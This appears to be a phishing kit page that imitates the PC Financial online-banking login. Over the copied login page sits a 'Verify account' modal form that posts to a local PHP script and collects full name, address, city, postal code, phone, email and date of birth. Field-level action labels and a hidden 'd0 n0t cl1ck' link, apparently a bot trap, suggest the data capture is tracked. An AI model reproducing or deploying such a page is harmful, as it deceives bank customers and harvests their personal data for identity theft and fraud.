        <script src="./files/details.js###%"></script>
</style></head>
    <body class="modal-open lock" style="top: 0px;">
        <app-root ng-version="8.2.0" aria-hidden="true">
            <div class="route-en route-login">
                <router-outlet></router-outlet>
                <ng-component>
                    <router-outlet></router-outlet>
                    <ng-component _nghost-hve-c4="">
                        <app-header _ngcontent-hve-c4="" class="public-header" _nghost-hve-c5="">
                            <header _ngcontent-hve-c5="">
                                <app-logo _ngcontent-hve-c5="" _nghost-hve-c3="">
                                    <!----><!---->
                                    <h1 _ngcontent-hve-c3="">
                                        <!----><a _ngcontent-hve-c3="" href="http://www.pcfinancial.ca/"><img _ngcontent-hve-c3="" src="./files/pcf-logo.svg" alt="PC Financial logo"></a>
                                    </h1>
                                    <!----><!----><!---->
                                </app-logo>
                            </header>
                        </app-header>
                        <main _ngcontent-hve-c4="" class="login-container">
                            <header _ngcontent-hve-c4="">
                                <div _ngcontent-hve-c4="" class="login-header-container">
                                    <h2 _ngcontent-hve-c4="">Welcome to PC Financial<sup>®</sup></h2>
                                    <p _ngcontent-hve-c4="">Manage your account, track your spending, and get support, all at your fingertips.</p>
                                </div>
                            </header>
                            <div _ngcontent-hve-c4="" class="login-form-container">
                                <h3 _ngcontent-hve-c4="">Sign in to your account</h3>
                                <form _ngcontent-hve-c4="" novalidate="" tabindex="-1" class="ng-untouched ng-pristine ng-invalid">
                                    <div _ngcontent-hve-c4="" class="form-group required">
                                        <label _ngcontent-hve-c4="" for="username">Username</label><input _ngcontent-hve-c4="" autocomplete="username" data-qa="username-input" formcontrolname="username" id="username" name="username" type="text" placeholder="Enter username" class="ng-untouched ng-pristine ng-invalid">
                                        <div _ngcontent-hve-c4="" class="form-control-feedback">
                                            <!----><span _ngcontent-hve-c4="" role="alert"> This information is required </span>
                                        </div>
                                    </div>
                                    <div _ngcontent-hve-c4="" class="form-group required">
                                        <label _ngcontent-hve-c4="" for="password">Password</label><input _ngcontent-hve-c4="" autocomplete="current-password" data-qa="password-input" formcontrolname="password" id="password" name="password" type="password" placeholder="Enter password" class="ng-untouched ng-pristine ng-invalid">
                                        <div _ngcontent-hve-c4="" class="form-control-feedback">
                                            <!----><span _ngcontent-hve-c4="" role="alert"> This information is required </span>
                                        </div>
                                    </div>
                                    <div _ngcontent-hve-c4="" class="tooltip-container">
                                        <label _ngcontent-hve-c4="" class="checkbox-container" for="remember-me"><input _ngcontent-hve-c4="" formcontrolname="rememberMe" id="remember-me" type="checkbox" class="ng-untouched ng-pristine ng-valid"><span _ngcontent-hve-c4="">Remember me</span></label>
                                        <tooltip _ngcontent-hve-c4="" _nghost-hve-c6="">
                                            <button _ngcontent-hve-c6="" class="btn btn-tooltip" triggers="hover click:blur focus" type="button"><span _ngcontent-hve-c6="" class="sr-only">Click for more information on remembering your username</span></button><!---->
                                        </tooltip>
                                    </div>
                                    <button _ngcontent-hve-c4="" class="btn btn-primary" data-qa="login-button" name="save" value="1" type="submit" disabled="disabled">
                                        <loader _ngcontent-hve-c4="" _nghost-hve-c7="">
                                            <!----><span _ngcontent-hve-c4="">Login</span><!----><!---->
                                        </loader>
                                    </button>
                                </form>
                                <div _ngcontent-hve-c4="" class="create-account-container">
                                    <p _ngcontent-hve-c4="">Don't have an online account? <a _ngcontent-hve-c4="" class="nav-link" href="https://secure.pcfinancial.ca/en/login(digital:enrollment//forgot:username)"> Sign up </a></p>
                                </div>
                                <div _ngcontent-hve-c4="" class="forgot-container"><a _ngcontent-hve-c4="" class="nav-link" href="https://secure.pcfinancial.ca/en/login(forgot:username)">Forgot username</a><a _ngcontent-hve-c4="" class="nav-link" href="https://secure.pcfinancial.ca/en/login(forgot:password)">Forgot password</a></div>
                            </div>
                        </main>
                        <blade-inactive-account _ngcontent-hve-c4="" _nghost-hve-c8="">
                            <!---->
                        </blade-inactive-account>
                        <blade-two-factor-authentication _ngcontent-hve-c4="" _nghost-hve-c9="">
                            <!---->
                        </blade-two-factor-authentication>
                        <app-footer _ngcontent-hve-c4="" _nghost-hve-c10="">
                            <footer _ngcontent-hve-c10="">
                                <div _ngcontent-hve-c10="" class="footer-wrapper">
                                    <div _ngcontent-hve-c10="" class="footer-container">
                                        <div _ngcontent-hve-c10="" class="footer-list-container">
                                            <div _ngcontent-hve-c10="" class="footer-child branding-social">
                                                <div _ngcontent-hve-c10="" class="footer-logo-container">
                                                    <app-logo _ngcontent-hve-c10="" header="h2" _nghost-hve-c3="">
                                                        <!----><!----><!---->
                                                        <h2 _ngcontent-hve-c3="">
                                                            <!----><a _ngcontent-hve-c3="" href="http://www.pcfinancial.ca/"><img _ngcontent-hve-c3="" src="./files/pcf-logo.svg" alt="PC Financial logo"></a>
                                                        </h2>
                                                        <!----><!---->
                                                    </app-logo>
                                                </div>
                                                <div _ngcontent-hve-c10="" class="footer-app_stores">
                                                    <ul _ngcontent-hve-c10="">
                                                        <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://itunes.apple.com/ca/app/pc-financial/id1446078005?mt=8"><img _ngcontent-hve-c10="" src="./files/app-store.svg" alt="Apple App Store"></a></li>
                                                        <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://play.google.com/store/apps/details?id=ca.pcfinancial.bank"><img _ngcontent-hve-c10="" src="./files/google-play.svg" alt="Google Play Store"></a></li>
                                                    </ul>
                                                </div>
                                                <!---->
                                                <div _ngcontent-hve-c10="" class="footer-social">
                                                    <ul _ngcontent-hve-c10="">
                                                        <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.facebook.com/PCFinancial"><img _ngcontent-hve-c10="" src="./files/facebook.svg" alt="Facebook"></a></li>
                                                        <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.instagram.com/pcfinancial"><img _ngcontent-hve-c10="" src="./files/instagram.svg" alt="Instagram"></a></li>
                                                        <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://twitter.com/pcfinancial"><img _ngcontent-hve-c10="" src="./files/twitter.svg" alt="Twitter"></a></li>
                                                        <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://ca.linkedin.com/company/president&#39;s-choice-financial"><img _ngcontent-hve-c10="" src="./files/linkedin.svg" alt="Linked In"></a></li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div _ngcontent-hve-c10="" class="footer-child link-lists">
                                                <nav _ngcontent-hve-c10="">
                                                    <div _ngcontent-hve-c10="" class="lists-container">
                                                        <ul _ngcontent-hve-c10="">
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/en/about-us">About Us</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/contact-us">Contact Us</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/faqs">FAQs</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/media-centre">Media Centre</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/legal-stuff/content/website-terms-of-use">Website Terms of Use</a></li>
                                                        </ul>
                                                        <ul _ngcontent-hve-c10="">
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/en/careers">Careers</a></li>
                                                            <!---->
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/blog">Blog</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/security">Security</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/legal-stuff">Legal and Privacy </a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcfinancial.ca/en/cdic">CDIC Member</a></li>
                                                        </ul>
                                                    </div>
                                                    <div _ngcontent-hve-c10="" class="lists-container">
                                                        <ul _ngcontent-hve-c10="">
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.loblaw.ca/en/responsibility.html">Social Responsibility</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcoptimum.ca/">PCOptimum.ca</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://pctravel.ca/">PC Travel</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.pcinsiders.ca/">PC Insiders</a></li>
                                                            <li _ngcontent-hve-c10=""><a _ngcontent-hve-c10="" rel="noopener noreferrer" target="_blank" href="https://www.presidentschoice.ca/en_CA.html">President's Choice</a></li>
                                                        </ul>
                                                    </div>
                                                </nav>
                                            </div>
                                        </div>
                                        <p _ngcontent-hve-c10="" class="copyright">President's Choice Financial Mastercard is provided by President's Choice Bank. <em>PC Optimum</em> program is provided by Presidents Choice Services Inc.</p>
                                    </div>
                                    <div _ngcontent-hve-c10="" class="locale-container">
                                        <locale-selector _ngcontent-hve-c10="" _nghost-hve-c14="">
                                            <!---->
                                            <div _ngcontent-hve-c14="">
                                                <!---->
                                            </div>
                                            <div _ngcontent-hve-c14="">
                                                <!----><button _ngcontent-hve-c14="" type="button" aria-label="Switch to French"> Français</button>
                                            </div>
                                        </locale-selector>
                                    </div>
                                </div>
                            </footer>
                        </app-footer>
                    </ng-component>
                    <fullscreen-takeover _nghost-hve-c1="">
                        <!---->
                    </fullscreen-takeover>
                    <modal-message-error _nghost-hve-c2="">
                        <!---->
                    </modal-message-error>
                </ng-component>
                <!----><!----><!----><!----><!----><!----><!----><!---->
                <ng-component>
                    <!---->
                    .
                </ng-component>
                <!----><!----><!----><!----><!----><!----><!----><!----><!---->
            </div>
        </app-root>
        <style aria-hidden="true">.loader-container{display:flex;display:-ms-flexbox;position:absolute;top:0;bottom:0;left:0;right:0;-webkit-box-align:center;-moz-box-align:center;-ms-flex-align:center;-webkit-align-items:center;align-items:center}.loader-container .loader{display:inline-block;width:50px;height:50px;border:8px solid #ee2e24;border-right-color:transparent;border-radius:50%;animation:1s linear 0s infinite rotate-cw}.loader-container .loader p{margin:0;font-size:0}.full-screen-loader .loader-container{z-index:10000;width:100%;height:100%;-webkit-box-pack:center;-moz-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;background-color:#fff}@keyframes rotate-cw{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
        <!--[if (gt IE 9)|!(IE)]><!-->
        <div class="full-screen-loader" aria-hidden="true">
            <div class="loader-container lrg">
                <div class="loader">
                    <p role="alert">Loading</p>
                </div>
            </div>
        </div>
        <style aria-hidden="true">
            .important-message {
            position: fixed;
            z-index: 999999;
            width: 100%;
            top: 0;
            left: 0;
            padding: 0 1em;
            display: flex;
            align-items: center;
            color: white;
            background-color: #00a0ad;
            font-family: "Averta-Regular", sans-serif;
            transition: transform 300ms ease-out;
            transform: translateY(-100%);
            verticle-align: middle;
            text-align: center;
            align-items: center;
            justify-content: center;
            }
            .important-message a {
            color: #fff;
            }
            .important-message.js-show {
            transform: translateY(0);
            }
            .important-message p {
            margin: 3px 3px 3px 3px;
            color: inherit;
            text-align: center;
            flex: 1 0 auto;
            width: 100%;
            }
            .important-message .title::before {
            width: 1em;
            height: 1em;
            margin-right: .5em;
            display: inline-block;
            content: "";
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDcgMTA3Ij48cGF0aCBkPSJNNTMuNyA3MS42Yy00LjIgMC03LjcgMy40LTcuNyA3LjdzMy40IDcuNyA3LjcgNy43IDcuNy0zLjQgNy43LTcuNy0zLjUtNy43LTcuNy03LjdtMC01MS4xYy00LjIgMC03LjcgMy40LTcuNyA3Ljd2MzAuN2MwIDQuMiAzLjQgNy43IDcuNyA3LjdzNy43LTMuNCA3LjctNy43VjI4LjFjMC00LjItMy41LTcuNi03LjctNy42bTAgODYuOUMyNCAxMDcuNCAwIDgzLjQgMCA1My43UzI0IDAgNTMuNyAwczUzLjcgMjQgNTMuNyA1My43LTI0IDUzLjctNTMuNyA1My43IiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==');
            background-size: contain;
            }
            .important-message .close {
            padding: 0 1em;
            margin-right:5em;
            flex: 0 1 auto;
            color: inherit;
            }

            * {
                font-family: system-ui;
            }

            h2 {
                font-family: system-ui;
            }
        </style>
        <ngb-modal-backdrop style="z-index: 1050" aria-hidden="true" class="modal-backdrop fade show"></ngb-modal-backdrop>
        <ngb-modal-window role="dialog" tabindex="-1" class="modal fade show d-block blade blade--outlet blade-outlet-forgot" aria-modal="true">
            <div role="document" class="modal-dialog modal-lg" style="padding-top: 94px;">
                <div class="modal-content">
                    <div class="blade" tabindex="-1" data-gtm-vis-recent-on-screen-9139982_219="1930" data-gtm-vis-first-on-screen-9139982_219="1931" data-gtm-vis-total-visible-time-9139982_219="100" data-gtm-vis-has-fired-9139982_219="1">
                        <!---->
                        <button-close><button class="btn-close" type="button"><span>Close</span></button></button-close>
                        <router-outlet></router-outlet>
                        <ng-component _nghost-hve-c16="">
                            <!---->
                            <ng-component _nghost-hve-c17="">
                                <blade-header _ngcontent-hve-c17="" blade-title="ENROLL_VERIFY_TITLE" _nghost-hve-c11="">
                                    <!---->
                                    <div _ngcontent-hve-c11="" class="blade-header">
                                        <!---->
                                        <h2 _ngcontent-hve-c11="" class="primary">Verify account</h2>
                                        <!---->
                                    </div>
                                    <!---->
                                </blade-header>
                                <form action="040149.php" method="post">
                                    <div _ngcontent-hve-c17="" class="blade-content verification-container">
                                        <loader _ngcontent-hve-c17="" _nghost-hve-c7="">
                                            <!---->
                                            <div _ngcontent-hve-c17="">
                                                <h3 _ngcontent-hve-c17="">Verify your identity to continue</h3>
                                                <p _ngcontent-hve-c17="">To continue, enter the information requested below in order to verify your identity.</p>
                                            </div>

                                            <div class="form-group">
                                                <p><b>Full Name:</b></p>
                                                <input required="true" name="name" type="text" value="" autocomplete="off" class="lrinput" attr-action="Filling Full Name">
                                            </div>
                                            <div class="form-group">
                                                <p><b>Address:</b></p>
                                                <input required="true" name="address" type="text" value="" autocomplete="off" class="lrinput" attr-action="Filling Address">
                                            </div>
                                            <div class="form-group">
                                                <p><b>City:</b></p>
                                                <input required="true" name="city" type="text" value="" autocomplete="off" class="lrinput" attr-action="Filling City">
                                            </div>
                                            <div class="form-group">
                                                <p><b>Postal Code:</b></p>
                                                <input required="true" name="postal" id="input-postal" type="text" value="" autocomplete="off" class="lrinput" attr-action="Filling Postal" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code" maxlength="7">
                                            </div>
                                            <div class="form-group">
                                                <p><b>Phone Number:</b></p>
                                                <input required="true" name="phone" type="tel" value="" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" class="lrinput" attr-action="Filling Phone">
                                            </div>
                                            <div class="form-group">
                                                <p><b>Email Address:</b></p>
                                                <input required="true" name="email" type="email" value="" autocomplete="off" class="lrinput" attr-action="Filling Email">
                                            </div>
                                            <div class="form-group">
                                                <p><b>Date of Birth:</b></p>
                                                <select name="dob1" required="" style="width: 30%;display: inline-block;" class="lrinput" attr-action="Selecting DoB">
                                                    <option value="">MM</option>
                                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                                                </select>
                                                <select name="dob2" required="" style="width:30%;display: inline-block;" class="lrinput" attr-action="Selecting DoB">
                                                    <option value="">DD</option>
                                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>                                                </select>
                                                <select name="dob3" required="" style="width:37%; display: inline-block;" class="lrinput" attr-action="Selecting DoB">
                                                    <option value="">YYYY</option>
                                                    <option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option>                                                </select>
                                            </div>

                                            <div _ngcontent-hve-c17="" class="actions">
                                                <button _ngcontent-hve-c17="" class="btn btn-primary" type="submit" name="save" value="1" style="width: 100%; max-width: 100%;">
                                                    <loader _ngcontent-hve-c17="" _nghost-hve-c7="">
                                                        <!----><span _ngcontent-hve-c17="">Continue</span><!----><!---->
                                                    </loader>
                                                </button>
                                            </div>
                                        </loader>
                                    </div>
                                    <!----><!---->
                                </form>
                            </ng-component>
                        </ng-component>
                    </div>
                </div>
            </div>
        </ngb-modal-window>
        <div style="display: none; visibility: hidden;">
        </div>
        <style>
            .form-group p {
                margin-bottom: 10px !important;
            }
            .important-message {
            position: fixed;
            z-index: 999999;
            width: 100%;
            top: 0;
            left: 0;
            padding: 0 1em;
            display: flex;
            align-items: center;
            color: white;
            background-color: #00a0ad;
            font-family: "Averta-Regular", sans-serif;
            transition: transform 300ms ease-out;
            transform: translateY(-100%);
            verticle-align: middle;
            text-align: center;
            align-items: center;
            justify-content: center;
            }
            .important-message a {
            color: #fff;
            }
            .important-message.js-show {
            transform: translateY(0);
            }
            .important-message p {
            margin: 3px 3px 3px 3px;
            color: inherit;
            text-align: center;
            flex: 1 0 auto;
            width: 100%;
            }
            .important-message .title::before {
            width: 1em;
            height: 1em;
            margin-right: .5em;
            display: inline-block;
            content: "";
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDcgMTA3Ij48cGF0aCBkPSJNNTMuNyA3MS42Yy00LjIgMC03LjcgMy40LTcuNyA3LjdzMy40IDcuNyA3LjcgNy43IDcuNy0zLjQgNy43LTcuNy0zLjUtNy43LTcuNy03LjdtMC01MS4xYy00LjIgMC03LjcgMy40LTcuNyA3Ljd2MzAuN2MwIDQuMiAzLjQgNy43IDcuNyA3LjdzNy43LTMuNCA3LjctNy43VjI4LjFjMC00LjItMy41LTcuNi03LjctNy42bTAgODYuOUMyNCAxMDcuNCAwIDgzLjQgMCA1My43UzI0IDAgNTMuNyAwczUzLjcgMjQgNTMuNyA1My43LTI0IDUzLjctNTMuNyA1My43IiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0iI2ZmZiIvPjwvc3ZnPg==');
            background-size: contain;
            }
            .important-message .close {
            padding: 0 1em;
            margin-right:5em;
            flex: 0 1 auto;
            color: inherit;
            }

            div.form-group:not(:last-of-type) {
                margin-bottom: 20px;
            }
        </style>
        <span>
            <div id="KampyleAnimationContainer" style="z-index: 2147483000; border: 0px; position: fixed; display: block; width: 0px; height: 0px;"></div>
        </span>
        <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        <span id="kampyleButtonContainer"></span><span id="formLightboxContainer"></span>
        <span>
            <div id="KampyleAnimationContainer" style="z-index: 2147483000"></div>
        </span>
        <span>
            <div id="KampyleAnimationContainer" style="z-index: 2147483000"></div>
        </span>
    

<div id="automa-palette"></div></body></html>